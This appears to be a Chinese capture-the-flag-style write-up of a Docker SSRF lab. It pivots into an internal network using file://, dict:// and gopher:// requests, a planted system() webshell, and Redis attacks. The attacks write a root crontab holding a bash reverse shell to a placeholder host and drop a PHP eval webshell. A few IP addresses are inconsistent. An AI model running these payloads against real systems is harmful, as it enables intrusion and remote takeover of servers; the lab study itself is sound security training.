# SSRF打穿内网WP心得

首先是创建靶场环境，直接在GitHub上下载也行，还是docker拉靶场环境会比较好，比较正规，直接在GitHub上下载的话会有很多干扰项。

正式开始：

首先先检测该网站是否存在SSRF漏洞，测试localhost和公共网站，查看是否有回显

发现有漏洞之后，测试获取内网URL，请求127.0.0.1

获取本地信息：

```
file:///etc/passwd
file:///etc/hosts
```

第一个file协议读取本地的文件信息，

第二个file协议尝试获取存在SSRF漏洞的本机内网IP地址信息，确认当前资产的网段信息：

根据返回判断当前机器的内网地址：127.23.23.21，然后就是对这个内网资产进行信息收集

> 其他的获取内网地址的方法：
>
> 当级别高的时候：
>
> ```
> /proc/net/arp或者/etc/network/interfaces
> ```
>
> 来判断当前机器的网络情况

DICT协议：

SSRF配合DICT协议探测内网端口开放的情况，但不是所有的端口都可以被探测，一般只能测出一些带TCP回显的端口：

用burp intruder来爆破端口ip就行：

```
172.72.23.21 - 80
172.72.23.22 - 80
172.72.23.23 - 80、3306
172.72.23.24 - 80
172.72.23.25 - 80
172.72.23.26 - 8080
172.72.23.27 - 6379
172.72.23.28 - 6379
172.72.23.29 - 3306
```

然后就可以获得这些端口的开放信息。

我们要做的就是从外部打到内部

那么就是先访问最外部的SSRF，`172.72.23.22`

如果想要利用SSRF漏洞对内网的Web资产进行目录扫描，用dirsearch不太方便，所以直接用burp suite抓包爆破，导入字典。

查到两个目录：

```
phpinfo.php shell.php
```

查看这两个站点：

第一个就是一些版本信息，可以算是一个敏感文件

第二个是经典的system一句话木马

![image-20251225010208530](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251225010208530.png)

根据这个后面写一些命令就比较方便了。

我们就可以到下一步，因为，这个一句话木马，所以可以直接使用SSRF的HTTP协议来发起GET请求，直接给cmd参数传入命令值，导致命令直接执行：

```
http://xxxxxx/shell.php?cmd=cat%20/etc/hosts
```

从hosts文件中又可以看到已经有22这台机器的权限了。

有权限之后就可以去查询cat flag文件





gopher协议：

这种场景和之前的攻击场景稍微不太一样，之前的代码注入和 SQL 注入都是直接通过 GET 方式来传递参数进行攻击的，但是这个命令执行的场景是通过 POST 方式触发的，我们无法使用使用 SSRF 漏洞通过 HTTP 协议来传递 POST 数据，这种情况下一般就得利用 gopher 协议来发起对内网应用的 POST 请求了，gopher 的基本请求格式如下：

[![img](https://image.3001.net/images/20210317/16159601558925.png)](https://image.3001.net/images/20210317/16159601558925.png)

gopher 协议是一个古老且强大的协议，从请求格式可以看出来，可以传递最底层的 TCP 数据流，因为 HTTP 协议也是属于 TCP 数据层的，所以通过 gopher 协议传递 HTTP 的 POST 请求也是轻而易举的。

首先来抓取正常情况下 POST 请求的数据包，删除掉 HTTP 请求的这一行：

```
Accept-Encoding: gzip, deflate
```

> 如果不删除的话，打出的 SSRF 请求会乱码，因为被两次 gzip 编码了。

接着在 Burpsuite 中将本 POST 数据包进行两次 URL 编码：

[![img](https://image.3001.net/images/20210317/16159620724415.png)](https://image.3001.net/images/20210317/16159620724415.png)

两次 URL 编码后的数据就最终的 TCP 数据流，最终 SSRF 完整的攻击请求的 POST 数据包如下：

[![img](https://image.3001.net/images/20210317/16159622165771.png)](https://image.3001.net/images/20210317/16159622165771.png)

可以看到通过 SSRF 成功攻击了 172.72.23.24 的命令执行 Web 应用，顺利执行了 `cat /etc/hosts` 的命令：

[![img](https://image.3001.net/images/20210317/16159623108967.png)](https://image.3001.net/images/20210317/16159623108967.png)







redis未授权：

## Redis unauth 应用详情

内网的 172.72.23.27 主机上的 6379 端口运行着未授权的 Redis 服务，系统没有 Web 服务（无法写 Shell），无 SSH 公私钥认证（无法写公钥），所以这里攻击思路只能是使用定时任务来进行攻击了。常规的攻击思路的主要命令如下：

```
# 清空 key
flushall

# 设置要操作的路径为定时任务目录
config set dir /var/spool/cron/

# 设置定时任务角色为 root
config set dbfilename root

# 设置定时任务内容
set x "\n* * * * * /bin/bash -i >& /dev/tcp/x.x.x.x/2333 0>&1\n"

# 保存操作
save
```

## SSRF 之 Redis unauth

SSRF 攻击的话并不能使用 redis-cli 来连接 Redis 进行攻击操作，未授权的情况下可以使用 dict 或者 gopher 协议来进行攻击，因为 gopher 协议构造比较繁琐，所以本场景建议直接使用 DICT 协议来攻击，效率会高很多，DICT 协议除了可以探测端口以外，另一个奇技淫巧就是攻击未授权的 Redis 服务，格式如下：

```
dict://x.x.x.x:6379/<Redis 命令>
```

[![img](https://image.3001.net/images/20210317/16159716703465.png)](https://image.3001.net/images/20210317/16159716703465.png)

通过 SSRF 直接发起 DICT 请求，可以成功看到 Redis 返回执行完 info 命令后的结果信息，下面开始直接使用 dict 协议来创建定时任务来反弹 Shell：

```
# 清空 key
dict://172.72.23.27:6379/flushall

# 设置要操作的路径为定时任务目录
dict://172.72.23.27:6379/config set dir /var/spool/cron/

# 在定时任务目录下创建 root 的定时任务文件
dict://172.72.23.27:6379/config set dbfilename root

# 写入 Bash 反弹 shell 的 payload
dict://172.72.23.27:6379/set x "\n* * * * * /bin/bash -i >%26 /dev/tcp/x.x.x.x/2333 0>%261\n"

# 保存上述操作
dict://172.72.23.27:6379/save
```

> SSRF 传递的时候记得要把 `&` URL 编码为 `%26`，上面的操作最好再 BP 下抓包操作，防止浏览器传输的时候被 URL 打乱编码

[![img](https://image.3001.net/images/20210510/16205798556776.png)](https://image.3001.net/images/20210510/16205798556776.png)

在目标系统上创建定时任务后，shell 也弹了出来，查看下 `cat /etc/hosts` 的确是 172.72.23.27 这台内网机器：

[![img](https://image.3001.net/images/20210507/1620373632443.png)](https://image.3001.net/images/20210507/1620373632443.png)

# 172.72.23.28 - Redis 有认证

## Redis auth 应用详情

本版块属于上帝视角，主要作用是给读者朋友们展示一下应用本身正常的功能点情况，这样后面直接使用 SSRF 来攻击的话，思路就会更加清晰明了。

该 172.72.23.28 主机运行着 Redis 服务，但是有密码验证，无法直接未授权执行命令：

[![img](https://image.3001.net/images/20210507/16203786039801.png)](https://image.3001.net/images/20210507/16203786039801.png)

不过除了 6379 端口还开放了 80 端口，是一个经典的 LFI 本地文件包含，可以利用此来读取本地的文件内容：

[![img](https://image.3001.net/images/20210507/16203790367605.png)](https://image.3001.net/images/20210507/16203790367605.png)

因为 Redis 密码记录在 redis.conf 配置文件中，结合这个文件包含漏洞点，那么这时来尝试借助文件包含漏洞来读取 redis 的配置文件信息，Redis 常见的配置文件路径如下：

```
/etc/redis.conf
/etc/redis/redis.conf
/usr/local/redis/etc/redis.conf
/opt/redis/ect/redis.conf
```

成功读取到 `/etc/redis.conf` 配置文件，直接搜索 `requirepass` 关键词来定位寻找密码：

[![img](https://image.3001.net/images/20210507/1620379158609.png)](https://image.3001.net/images/20210507/1620379158609.png)

拿到密码的话就可以正常和 Redis 进行交互了：

[![img](https://image.3001.net/images/20210507/16203793021008.png)](https://image.3001.net/images/20210507/16203793021008.png)

## SSRF 之 Redis auth

首先借助目标系统的 80 端口上的文件包含拿到 Redis 的密码：P@ssw0rd

[![img](https://image.3001.net/images/20210507/16203795678307.png)](https://image.3001.net/images/20210507/16203795678307.png)

有密码的话先使用 dict 协议进行密码认证看看：

[![img](https://image.3001.net/images/20210507/16203796537306.png)](https://image.3001.net/images/20210507/16203796537306.png)

但是因为 dict 不支持多行命令的原因，这样就导致认证后的参数无法执行，所以 dict 协议理论上来说是没发攻击带认证的 Redis 服务的。

那么只能使用我们的老伙计 gopher 协议了，gopher 协议因为需要原生数据包，所以我们需要抓取到 Redis 的请求数据包。可以使用 Linux 自带的 socat 命令来进行本地的模拟抓取：

命令来进行本地的模拟抓取：

```
socat -v tcp-listen:4444,fork tcp-connect:127.0.0.1:6379
```

此时使用 redis-cli 连接本地的 4444 端口：

```
➜  ~ redis-cli -h 127.0.0.1 -p 4444
127.0.0.1:4444>
```

服务器接着会把 4444 端口的流量接受并转发给服务器的 6379 端口，然后认证后进行往网站目录下写入 shell 的操作：

```
# 认证 redis
127.0.0.1:4444> auth P@ssw0rd
OK

# 清空 key
127.0.0.1:4444> flushall

# 设置要操作的路径为网站根目录
127.0.0.1:4444> config set dir /var/www/html

# 在网站目录下创建 shell.php 文件
127.0.0.1:4444> config set dbfilename shell.php

# 设置 shell.php 的内容
127.0.0.1:4444> set x "\n<?php eval($_GET[1]);?>\n"

# 保存上述操作
127.0.0.1:4444> save
```

与此同时我们还可以看到详细的数据包情况，下面来记录一下关键的流量情况：

[![img](https://image.3001.net/images/20210507/16203835195059.png)](https://image.3001.net/images/20210507/16203835195059.png)

可以看到 Redis 的流量并不难理解，可以根据上图橙色标记的注释来理解一下，接下来整理出关键的请求数据包如下：

```
*2\r
$4\r
auth\r
$8\r
P@ssw0rd\r
*1\r
$8\r
flushall\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$13\r
/var/www/html\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*3\r
$3\r
set\r
$1\r
x\r
$25\r


\r
*1\r
$4\r
save\r  
```

可以看到每行都是以 `\r` 结尾的，但是 Redis 的协议是以 CRLF (`\r\n`) 结尾，所以转换的时候需要把 `\r` 转换为 `\r\n`，然后其他全部进行 两次 URL 编码，这里借助 BP 就很容易解决：

[![img](https://image.3001.net/images/20210507/16203839384264.png)](https://image.3001.net/images/20210507/16203839384264.png)

最后放到 SSRF 的漏洞点进行请求：

[![img](https://image.3001.net/images/20210507/16203841323189.png)](https://image.3001.net/images/20210507/16203841323189.png)

执行成功的话会在 /var/www/html 根目录下写入 shell.php 文件，密码为 1，那么下面借助 SSRF 漏洞来试试看：

```
http://172.23.23.28/shell.php?1=phpinfo(); 
```

[![img](https://image.3001.net/images/20210507/16203841954734.png)](https://image.3001.net/images/20210507/16203841954734.png)

成功 getshell，那么消化吸收一下，下面尝试使用 SSRF 来攻击 MySQL 服务吧。